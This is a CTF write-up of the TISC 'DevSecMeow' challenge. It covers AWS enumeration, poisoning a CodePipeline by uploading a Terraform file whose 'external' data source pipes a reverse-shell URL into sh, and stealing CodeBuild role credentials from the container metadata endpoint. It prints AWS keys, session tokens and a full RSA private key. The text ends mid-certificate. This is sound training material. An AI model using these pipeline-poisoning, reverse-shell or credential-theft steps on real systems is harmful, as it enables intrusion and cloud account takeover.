Coming from a very straightforward level 6, this challenge was a significant step up in difficulty as well as length. However, I learned quite a bit about AWS and enumeration from it.

# 1. Initial examination

![landing page](/devsecmeow-landing.png)

First, I clicked on the two urls. The first one ("submit the required details here") seems to return json data, with another two urls - one url for `csr` and one for `crt`. The second urls ("temporary credentials here") returns 403 unauthorized.

I then tried to access the `csr` and `crt` urls. Both of them returned some error, hence I did some research and realised that they were aws presigned urls to access files in a s3 bucket. However, I was still unable to interact with either of them. So I returned to the landing page, and found a helpful list of tips:

```plaintext
Okay I am ready to tackle the problem(s). Any tips?

- What kind of details am I supposed to submit?
  - Open your favourite search engine
  - Research on mtls
- How do I interact with the URLs?
  - Look at the URL
  - One for upload, one for download
- The links don't seem to work?
  - Don't worry. The link expires in around 15 minutes
  - If more than 15 minutes have past, just regenerate another one
- How long does my temporary credential last?
  - Probably around 2 hours
- I am still facing issues... What do I do?
  - No worries, we all learn and improve along the way.
  - Relook at the information and try again
  - Remember to document down what you have tried to avoid doing the same thing repeatedly.
```

# 2. MTLS

As instructed, I did research on mtls. It seems to be an extension of tls, where the client has to provide a certificate to prove their identity to the server, and vice versa. The client sends a certificate request from a csr file and the certificate authority (CA) returns the signed crt file. I reasoned that I would need to generate a csr file and upload it to the s3 bucket using the first url, and then download the crt file from the second url.

I generated the csr file using openssl, as follows: `openssl req -new -newkey rsa:4096 -nodes -keyout client.key -out client.csr`.
Then uploaded it to the s3 bucket: `curl -X PUT -T client.csr <csr upload url>`

Now I was able to download a crt file using the `crt` url. I created a p12 file using `openssl pkcs12 -export -out client.p12 -inkey client.key -in client.crt`, which I then imported into Chrome. Then I tried to access the "temporary credentials here" url again.

Here, I faced a 504 gateway timeout error, and I could not figure out what was the problem. In the end, it turned out to be an issue with the server infrastructure, as around a day later I was suddenly able to access the site.

After I was able to access the site, I greeted with the following json data: `{"Message": "Hello new agent, use the credentials wisely! It should be live for the next 120 minutes! Our antivirus will wipe them out and the associated resources after the expected time usage.", "Access_Key": "AKIATMLSTF3N43WNMNAW", "Secret_Key": "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"}`

I figured out that these were aws credentials, hence I installed the `awscli` package and added the credentials using `aws configure`.

# 3. Enumeration

Next I have to figure out what I can access with these credentials, so I began enumerating the permissions. I found a useful script online to do this:

```sh:getUserIamPermissions.sh
#!/bin/bash
function _getUserIamPermissions() {
    export AWS_PAGER="";
    local _user="${1}";
    
    local outputManagedPolicies="";
    local outputUserPolicies="";
    local outputManagedGroupPolicies="";
    local outputGroupPolicies="";

    # Managed Policies Attached to the IAM User
    local _managedpolicies=$(aws iam list-attached-user-policies --user-name "${_user}" | jq -r '.AttachedPolicies[].PolicyArn';);
    for policy in ${_managedpolicies}; do
        local versionId=$(aws iam get-policy --policy-arn "${policy}" | jq -r '.Policy.DefaultVersionId';);
        outputManagedPolicies=$(aws iam get-policy-version --policy-arn "${policy}" --version-id "${versionId}";);
        printf "%s" "${outputManagedPolicies}";
    done;

    # Inline Policies on the IAM User
    local _userpolicies=$(aws iam list-user-policies --user-name "${_user}" | jq -r '.PolicyNames[]';);
    for policy in ${_userpolicies}; do
        outputUserPolicies=$(aws iam get-user-policy --user-name "${_user}" --policy-name "${policy}";);
        printf "%s" "${outputUserPolicies}";
    done;

    # Get all of the IAM User's assigned IAM Groups
    local _groups=$(aws iam list-groups-for-user --user-name "${_user}" | jq -r '.Groups[].GroupName';);
    for group in ${_groups}; do
        # Managed Policies Attached to the IAM Group
        local _managedgrouppolicies=$(aws iam list-attached-group-policies --group-name "${group}" | jq -r '.AttachedPolicies[].PolicyArn';);
        for policy in ${_managedgrouppolicies}; do
            local versionId=$(aws iam get-policy --policy-arn "${policy}" | jq -r '.Policy.DefaultVersionId';);
            outputManagedGroupPolicies=$(aws iam get-policy-version --policy-arn "${policy}" --version-id "${versionId}" | jq --arg arn "${policy}" '{"PolicyArn": $arn, "Policy": .}';);
            printf "%s" "${outputManagedGroupPolicies}";
        done;

        # Inline Policies on the IAM Group
        local _grouppolicies=$(aws iam list-group-policies --group-name "${group}" | jq -r '.PolicyNames[]';);
        for policy in ${_grouppolicies}; do
            outputGroupPolicies=$(aws iam get-group-policy --group-name "${group}" --policy-name "${policy}";);
            printf "%s" "${outputGroupPolicies}";
        done;
    done;
}

function main() {
    local name=$(aws sts get-caller-identity | jq -r '.Arn' | awk -F/ '{print $NF}';);
    echo ${name};
    _getUserIamPermissions "${name}" | jq -s;
}

main
```

When run, it produces the following output:

```plaintext
agent-847226c1050147649e31e30e2612463d

An error occurred (AccessDenied) when calling the ListGroupsForUser operation: User: arn:aws:iam::232705437403:user/agent-847226c1050147649e31e30e2612463d is not authorized to perform: iam:ListGroupsForUser on resource: user agent-847226c1050147649e31e30e2612463d because no identity-based policy allows the iam:ListGroupsForUser action
[
  {
    "PolicyVersion": {
      "Document": {
        "Version": "2012-10-17",
        "Statement": [
          {
            "Sid": "VisualEditor0",
            "Effect": "Allow",
            "Action": [
              "iam:GetPolicy",
              "ssm:DescribeParameters",
              "iam:GetPolicyVersion",
              "iam:List*Policies",
              "iam:Get*Policy",
              "kms:ListKeys",
              "events:ListRules",
              "events:DescribeRule",
              "kms:GetKeyPolicy",
              "codepipeline:ListPipelines",
              "codebuild:ListProjects",
              "iam:ListRoles",
              "codebuild:BatchGetProjects"
            ],
            "Resource": "*"
          },
          {
            "Sid": "VisualEditor2",
            "Effect": "Allow",
            "Action": [
              "iam:ListAttachedUserPolicies"
            ],
            "Resource": "arn:aws:iam::232705437403:user/${aws:username}"
          },
          {
            "Sid": "VisualEditor3",
            "Effect": "Allow",
            "Action": [
              "codepipeline:GetPipeline"
            ],
            "Resource": "arn:aws:codepipeline:ap-southeast-1:232705437403:devsecmeow-pipeline"
          },
          {
            "Sid": "VisualEditor4",
            "Effect": "Allow",
            "Action": [
              "s3:PutObject"
            ],
            "Resource": "arn:aws:s3:::devsecmeow2023zip/*"
          }
        ]
      },
      "VersionId": "v1",
      "IsDefaultVersion": true,
      "CreateDate": "2023-10-02T13:01:13Z"
    }
  }
]
```

After running through all the available commands, I saw that `aws codebuild list-projects` returned one project named `devsecmeow-build`. Running `aws codebuild batch-get-projects --names "devsecmeow-build"` then returned the following:

```json
{
    "projects": [
        {
            "name": "devsecmeow-build",
            "arn": "arn:aws:codebuild:ap-southeast-1:232705437403:project/devsecmeow-build",
            "source": {
                "type": "CODEPIPELINE",
                "buildspec": "version: 0.2\n\nphases:\n  build:\n    commands:\n      - env\n      - cd /usr/bin\n      - curl -s -qL -o terraform.zip https://releases.hashicorp.com/terraform/1.4.6/terraform_1.4.6_linux_amd64.zip\n      - unzip -o terraform.zip\n      - cd \"$CODEBUILD_SRC_DIR\"\n      - ls -la \n      - terraform init \n      - terraform plan\n",
                "insecureSsl": false
            },
            "artifacts": {
                "type": "CODEPIPELINE",
                "name": "devsecmeow-build",
                "packaging": "NONE",
                "overrideArtifactName": false,
                "encryptionDisabled": false
            },
            "cache": {
                "type": "NO_CACHE"
            },
            "environment": {
                "type": "LINUX_CONTAINER",
                "image": "aws/codebuild/amazonlinux2-x86_64-standard:5.0",
                "computeType": "BUILD_GENERAL1_SMALL",
                "environmentVariables": [
                    {
                        "name": "flag1",
                        "value": "/devsecmeow/build/password",
                        "type": "PARAMETER_STORE"
                    }
                ],
                "privilegedMode": false,
                "imagePullCredentialsType": "CODEBUILD"
            },
            "serviceRole": "arn:aws:iam::232705437403:role/codebuild-role",
            "timeoutInMinutes": 15,
            "queuedTimeoutInMinutes": 480,
            "encryptionKey": "arn:aws:kms:ap-southeast-1:232705437403:alias/aws/s3",
            "tags": [],
            "created": 1689951913.01,
            "lastModified": 1689951913.01,
            "badge": {
                "badgeEnabled": false
            },
            "logsConfig": {
                "cloudWatchLogs": {
                    "status": "ENABLED",
                    "groupName": "devsecmeow-codebuild-logs",
                    "streamName": "log-stream"
                },
                "s3Logs": {
                    "status": "DISABLED",
                    "encryptionDisabled": false
                }
            },
            "projectVisibility": "PRIVATE"
        }
    ],
    "projectsNotFound": []
}
```

Additionally, `aws codepipeline list-pipelines` yielded one `devsecmeow-pipeline`, and `aws codepipeline get-pipeline --name devsecmeow-pipeline` returned more important info on the pipelne:

```json
{
    "pipeline": {
        "name": "devsecmeow-pipeline",
        "roleArn": "arn:aws:iam::232705437403:role/codepipeline-role",
        "artifactStore": {
            "type": "S3",
            "location": "devsecmeow2023zip"
        },
        "stages": [
            {
                "name": "Source",
                "actions": [
                    {
                        "name": "Source",
                        "actionTypeId": {
                            "category": "Source",
                            "owner": "AWS",
                            "provider": "S3",
                            "version": "1"
                        },
                        "runOrder": 1,
                        "configuration": {
                            "PollForSourceChanges": "false",
                            "S3Bucket": "devsecmeow2023zip",
                            "S3ObjectKey": "rawr.zip"
                        },
                        "outputArtifacts": [
                            {
                                "name": "source_output"
                            }
                        ],
                        "inputArtifacts": []
                    }
                ]
            },
            {
                "name": "Build",
                "actions": [
                    {
                        "name": "TerraformPlan",
                        "actionTypeId": {
                            "category": "Build",
                            "owner": "AWS",
                            "provider": "CodeBuild",
                            "version": "1"
                        },
                        "runOrder": 1,
                        "configuration": {
                            "ProjectName": "devsecmeow-build"
                        },
                        "outputArtifacts": [
                            {
                                "name": "build_output"
                            }
                        ],
                        "inputArtifacts": [
                            {
                                "name": "source_output"
                            }
                        ]
                    }
                ]
            },
            {
                "name": "Approval",
                "actions": [
                    {
                        "name": "Approval",
                        "actionTypeId": {
                            "category": "Approval",
                            "owner": "AWS",
                            "provider": "Manual",
                            "version": "1"
                        },
                        "runOrder": 1,
                        "configuration": {},
                        "outputArtifacts": [],
                        "inputArtifacts": []
                    }
                ]
            }
        ],
        "version": 1
    },
    "metadata": {
        "pipelineArn": "arn:aws:codepipeline:ap-southeast-1:232705437403:devsecmeow-pipeline",
        "created": 1689951914.065,
        "updated": 1689951914.065
    }
}
```

# 4. Codebuild and Terraform to get RCE

So it seems that uploading `rawr.zip` to the devsecmeow2023zip bucket would trigger the pipeline, which would run the `devsecmeow-build` codebuild project. The buildspec is provided in the codebuild json, and printing it out would result in the following:

```
version: 0.2

phases:
  build:
    commands:
      - env
      - cd /usr/bin
      - curl -s -qL -o terraform.zip https://releases.hashicorp.com/terraform/1.4.6/terraform_1.4.6_linux_amd64.zip
      - unzip -o terraform.zip
      - cd "$CODEBUILD_SRC_DIR"
      - ls -la 
      - terraform init 
      - terraform plan
```

I did some research on terraform, and learned that it is a tool used to define infrastructure using code. I gained a brief overview with [this video](https://www.youtube.com/watch?v=tomUWcQ0P3k).

Although not specified in the buildspec, I assumed that the contents of rawr.zip would be in the same folder as CODEBUILD_SRC_DIR. Hence, I should be able to control terraform's behaviour by uploading a .tf configuration file. But is it possible to achieve RCE? I found the following information from [HackTricks](https://cloud.hacktricks.xyz/pentesting-ci-cd/terraform-security):

```plaintext
Injecting in a terraform config file something like the following will execute a rev shell when executing terraform plan:

data "external" "example" {
  program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```

I created a rawr folder, and in it I created a main.tf file with the above contents, except that I curled a webhook site instead of executing a reverse shell. Then I zipped it up and uploaded to the server (I wasted some time because I forgot `zip` by default includes the parent folder in the path as well, and you have to use the `-j` option to prevent this). After about a minute, I received a webhook notification, verifying that RCE worked.

Now I setup a reverse shell to more easily interact with the server. I used ngrok to create a tunnel to my localhost. Here are my commands:

```sh
nc -nvlp 5555
ngrok tcp 5555  # in a separate terminal
```

I updated main.tf accordingly, and uploaded it to the server (`aws s3 cp rawr.zip s3://devsecmeow2023zip`). I got connected after a while. Then, by running `env`, I found the first half of the flag: `flag1=TISC{pr0tecT_`

# 5. More enumeration

One of the first checks I ran was `whoami`. Surprisingly, I was root, however I guess this makes sense since I am on a codebuild machine spawned by the pipeline. I explored the filesystem but found nothing else of note.

After a while, I the `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/0441ae33-cea3-4db8-a92b-70d729772406` environment variable, and found that I could access the credentials using `curl http://169.254.170.2/v2/credentials/0441ae33-cea3-4db8-a92b-70d729772406`. This was the output (formatted):

```json
{
  "RoleArn": "AQICAHiXeu3bIBb9heJmFtHPbcbrxVOOY2z+gbh/ZektV0KIkAGdp+Y8u0PdcxbxyZWovLYZAAABATCB/gYJKoZIhvcNAQcGoIHwMIHtAgEAMIHnBgkqhkiG9w0BBwEwHgYJYIZIAWUDBAEuMBEEDPAlfpCppBxQNRJtmAIBEICBuUyQkrIR40PB/W2QvItRHQYFFWXbsMF43V8ykXOMyXcBZPyfX12mntgVKWGvvcy/nUZlBK1QHSnc/Kw+AtFHqOtCga81ZfW9tPyqdOlY8BCyiUD4SBoY+G2cx2Y1zDnGKR1WMd2+mxePuIfMADsBpcdX2YMbG89j2cVPYfKaVeizOY9HcO76brgT+HtYWiJSJR/QBONEo4+L7JL7nqdTtgSWgL2zwlQeiYS1iii1iQ8syOPJlgJpq5f9",
  "AccessKeyId": "ASIATMLSTF3NTAHNKWHK",
  "SecretAccessKey": "uvE1R5h1iK9cssgvwqYFEqe7oF5x3w67rXH2eTpS",
  "Token": "IQoJb3JpZ2luX2VjEA8aDmFwLXNvdXRoZWFzdC0xIkYwRAIgW8Ypco0Sc7try8gcaaG5n7965pNZubPfP60o+ZGhDKoCID/EDLrp0CXjaWQHhqSBy/jjThOtFzcR/KuLjgQY2Xh4KrUDCBgQABoMMjMyNzA1NDM3NDAzIgz1LGarwN/QFLsGmSIqkgMRJLFHO8MAHedlwFJdQvouMOVv+vEZHoVuxPrllO++Lz5tObKltYZVF3oo508QwwnSbWS/dRU+Ggb59+/JNksOTF0xP1y5aBYyZEs4dcKvaqLjYoerWQX66Iw1ixUEVUWj7QP1WpGKoN5xnTrzyqirOB8oSjU8BZjE66ENJ2UCm4pibyE+BQO9+mY4DG+/9bNcg2+GxOAkyviL/CMHS+IxviAB0hgs7yLDK6vPT/6VJuNXt4igQCSdw9zAp9YCcTIPf9Kt2aSitYVcRDpc+Pnd/124Q+b6i28ITZc+/U9mZKJrfL7s674FW2LhO6tg/5wM+9masH/KCDlzMWRDfMxmmkACe1jMBJbgM/50LRP++hu/iohZD7FWK/58FeO3o8n2GFmCwc0cXdaax6GU5DvhcqgqXO0Yke5mZOCsxbYYc7mcVPZkP5Y+dBPfq9KYpIjGNIHr/1Ho3Fn+prkINvE49oV5eATWJXxI7kZfwamtwvDYibSPcKsGEXwPgEDBWfBAF+2PqTlqpChwShYGnlBw93wwlrLrqAY6lAHsixEMfUXI4k2ds941f5O3LVWUUExlVMDVLpE8sGIpv/dLYsbZVZ64Y1qmGbhq/k/0JOpMfJ811JHrumg7oBDs3dUGXhFZc3Dq3GU4G/9i4S/5kwRYcWoxU1jDDlUpd4ETgsfwvMX0hs8H1OwfLyQo4ckgwrBQlWlJg30vH6zZo7mX7uETzXfdKzGnqq0fWWY7+eUl",
  "Expiration": "2023-10-02T15:52:06Z"
}
```

This time, I had to set the security token along with the access key and secret, and I found that you could do this by setting the `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY` and `AWS_SESSION_TOKEN` environment variables. I ran `./getUserIamPermissions.sh` again. However, it only produced errors this time because the credentials did not have the necessary permissions to list their permissions. However, I could run `aws sts get-caller-identity`, which gave the output:

```json
{
    "UserId": "AROATMLSTF3NTPC4Q2NAI:AWSCodeBuild-dd50b2ee-cc57-4110-a68f-5277a6806036",
    "Account": "232705437403",
    "Arn": "arn:aws:sts::232705437403:assumed-role/codebuild-role/AWSCodeBuild-dd50b2ee-cc57-4110-a68f-5277a6806036"
}
```

These credentials seem to be attached to the `codebuild-role` and not a particular user. Indeed, it seems possible that they were generated using `aws sts assume-role`. Using the original "agent" credentials which had permissions to list policies attached to a role, I called `aws iam list-role-policies --role-name codebuild-role` followed by `aws iam get-role-policy --policy-name policy_code_build --role-name codebuild-role`. This gave the permissions attached to the role:

```json
{
    "RoleName": "codebuild-role",
    "PolicyName": "policy_code_build",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Action": [
                    "logs:PutLogEvents",
                    "logs:CreateLogStream",
                    "logs:CreateLogGroup"
                ],
                "Effect": "Allow",
                "Resource": [
                    "arn:aws:logs:ap-southeast-1:232705437403:log-group:devsecmeow-codebuild-logs:log-stream:*",
                    "arn:aws:logs:ap-southeast-1:232705437403:log-group:devsecmeow-codebuild-logs/*",
                    "arn:aws:logs:ap-southeast-1:232705437403:log-group:devsecmeow-codebuild-logs"
                ]
            },
            {
                "Action": [
                    "kms:ReEncrypt*",
                    "kms:GenerateDataKey*",
                    "kms:Encrypt",
                    "kms:DescribeKey",
                    "kms:Decrypt"
                ],
                "Effect": "Allow",
                "Resource": "arn:aws:kms:ap-southeast-1:232705437403:key/6b677475-cc95-4f85-8baa-2f30290cde9d"
            },
            {
                "Action": "ssm:GetParameters",
                "Effect": "Allow",
                "Resource": "arn:aws:ssm:ap-southeast-1:232705437403:parameter/devsecmeow/build/password"
            },
            {
                "Action": "ec2:DescribeInstance*",
                "Effect": "Allow",
                "Resource": "*"
            },
            {
                "Action": [
                    "s3:PutObject",
                    "s3:GetObjectVersion",
                    "s3:GetObject",
                    "s3:GetBucketLocation",
                    "s3:GetBucketAcl"
                ],
                "Effect": "Allow",
                "Resource": [
                    "arn:aws:s3:::devsecmeow2023zip/devsecmeow-pipeline/*",
                    "arn:aws:s3:::devsecmeow2023zip"
                ]
            }
        ]
    }
}
```

The `describe-instances` action seemed interesting to me, and I called `aws ec2 describe-instances`. The full output is omitted for the sake of brevity, however I found two ec2 instances - one was the staging instance where I obtained the temporary credentials earlier. The other one had a public ip of 54.255.155.134, and when I accessed it I was greeted with a similar 403 page to the staging instance. After checking the tls certificate, I realised this was the production instance.

Then I listed all the available ec2 actions using `aws ec2 help | grep describe-instance`. I tried all of them except for `describe-instance-attribute` because I wrongly assumed based on the name that all the data was already included in the massive json object returned by `describe-instances`. Eventually though, I realised that there was a `userData` attribute. Running `aws ec2 describe-instance-attribute --attribute userData --instance-id <production instance id>`. This returned a large base64 encoded value, which when decoded revealed a bash script:

```sh
#!/bin/bash
sudo apt update
sudo apt upgrade -y 
sudo apt install nginx -y
sudo apt install awscli -y 
cat <<\EOL > /etc/nginx/nginx.conf
user www-data;
worker_processes auto;
pid /run/nginx.pid;
include /etc/nginx/modules-enabled/*.conf;

events {
        worker_connections 768;
        # multi_accept on;
}

http {

        sendfile on;
        tcp_nopush on;
        tcp_nodelay on;
        keepalive_timeout 65;
        types_hash_max_size 2048;

        include /etc/nginx/mime.types;
        default_type application/octet-stream;

        server {
                listen 443 ssl default_server;
                listen [::]:443 ssl default_server;
                ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; 
                ssl_prefer_server_ciphers on;

                ssl_certificate         /etc/nginx/server.crt;
                ssl_certificate_key     /etc/nginx/server.key;
                ssl_client_certificate  /etc/nginx/ca.crt;
                ssl_verify_client       optional;
                ssl_verify_depth        2;
                location / {
                                if ($ssl_client_verify != SUCCESS) { return 403; }

                                proxy_pass           http://flag_server;
                }

                access_log /var/log/nginx/access.log;
                error_log /var/log/nginx/error.log;
        }

        gzip off;
        include /etc/nginx/conf.d/*.conf;
        include /etc/nginx/sites-enabled/*;
}

EOL
cat <<\EOL > /etc/nginx/sites-enabled/default

upstream flag_server {
    server      localhost:3000;
}
server {
        listen 3000;

        root /var/www/html;

        index index.html;

        server_name _;

        location / {
                # First attempt to serve request as file, then
                # as directory, then fall back to displaying a 404.
                try_files $uri $uri/ =404;
        }

}
EOL
cat <<\EOL > /etc/nginx/server.crt
-----BEGIN CERTIFICATE-----
MIIDxzCCAq8CFF4sQY4xq1aAvfg5YdBJOrxqroG5MA0GCSqGSIb3DQEBCwUAMCAx
HjAcBgNVBAMMFWRldnNlY21lb3ctcHJvZHVjdGlvbjAeFw0yMzA3MjExNDUwNDFa
Fw0yNDA3MjAxNDUwNDFaMCAxHjAcBgNVBAMMFWRldnNlY21lb3cucHJvZHVjdGlv
bjCCAiIwDQYJKoZIhvcNAQEBBQADggIPADCCAgoCggIBAMYRqMc1usbS/4yoJ9qW
4QxHwFyHx6b7Mki4vVJD8GoNyGUWfUlksUhq84ZI4ZpAn78tvoV+lzeWQNw4XEz2
X3U3XI7AHFeQYo8WLcvaoAgj0P7uM1kbnoXUx54yraBty98uOKLDwuGD2ZNMyZjR
yE1005eehP/mrtH75N7fN8ZX2GD30/HgDs3wUcdN1N9/CGWF7s6zSMNKKyLbgzd4
UlOIY1jCQN0JyRfRikxfmuKWeElVCz4+iXvC8i69qRL4N63X5TM90jj9KIz1Kqco
gkX+mWaQSAKkGKQI6chYjoVbqQjjF80KO8/3WAFcXwir1C2Y4ZnmK3Y9o5J4Oyln
B5eVRklqsdLyv1KVu2xs1+grKtGet49n/SNMuMwesFmb6tPs3hM8aG0v/0W5eIXb
tBVwu4XwOlITWo1Te/wmP/zai6FYlyLIEpCD6LJ9/sajqxYtaslSHlgIjqTI9VKo
nahEbj8Xa7TMrNFbr2NY5z3oLypICrqE/zPuOgMBM6DX5cnlfqeAwIVnL5QxQoQe
ocwSDeAXDIcNdzHelUCgBiSjLw055hwNsLx/ZQ6Yu7Y4S0hE1CZZ3g++WoH/kLxi
i6pHoaTHsB4NIz5DYiQEydywzjnX7FAXqYwf4iZYLIiS9M6iXXB1OMBgtINVxglA
cBU54+I4u4h/CUkjPYPs8x11AgMBAAEwDQYJKoZIhvcNAQELBQADggEBACoCQZ5e
8a4RgMOoeqiaiKF4xVK8KQGtEUKjIeYT4LIeVFRhpB5m/RWxj2dshHNr1bJWFP+H
irecUisqLkpmAZRTGGbK98hN1muV85LRsyQTfesVNCT8Az3g0UUFN6rQdMoAqn97
lA/pK4N7Nxi7HDhaipZQ6uPcGVQkrcKOScxq7Y1IJ1Nq0qpKlrx2QIzB3rpE1Cpm
eYX1qHqgfLc+WGbwFfWF9raSG0bbLmB+krXtTUEqorTtr4RUQ3JCh0moJ5ToUgzc
qaYdKV87JdAsh88Dc8R4xEy+CgmP0Tecsdu4vp+QGLIFyKVXV1nPWF2ihz8XelLe
KiNii7b6V43HSrA=
-----END CERTIFICATE-----

EOL
cat <<\EOL > /etc/nginx/server.key
-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----

EOL
cat <<\EOL > /etc/nginx/ca.crt
-----BEGIN CERTIFICATE-----
MIIDITCCAgmgAwIBAgIUQ3SN/Ic7T2x1v6cA6gKPUxNSlNgwDQYJKoZIhvcNAQEL
BQAwIDEeMBwGA1UEAwwVZGV2c2VjbWVvdy1wcm9kdWN0aW9uMB4XDTIzMDcyMTE0
NTA0MFoXDTI0MDcyMDE0NTA0MFowIDEeMBwGA1UEAwwVZGV2c2VjbWVvdy1wcm9k
dWN0aW9uMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxNkskbb7nqRD
nVMFJrWQUYuCURyYjncGVZTEFzO1cOOEAR35DmcRuVgWTACUJdRRqb6lL/7Vbfgm
1TV8vj7x/qNciEvd4/NzotlBXYCXJLilLFUydxuEqzpxX9fCGxQJ0nsKDswYuUpi
7ire952y8YAlu/DAApfwm/K8rS2edvvJ22wr1QznmEIedf3GFI3giFgyiB81bmqs
W+vLwd599seSVc48sm4VdIbw1KxQrQVU9Rwr7VyR7frFIitPIpTRfD6P/vZAZSmd
icPAq+2iDGj1YEy4AfRsn+ah7XQqp5ZC4iZccZidHGVlHSmsDXqJ2kpweuYoVCzy
HjMIuPqkDwIDAQABo1MwUTAdBgNVHQ4EFgQUr87qLf+IfGrfkYajdItqMFzby78w
HwYDVR0jBBgwFoAUr87qLf+IfGrfkYajdItqMFzby78wDwYDVR0TAQH/BAUwAwEB
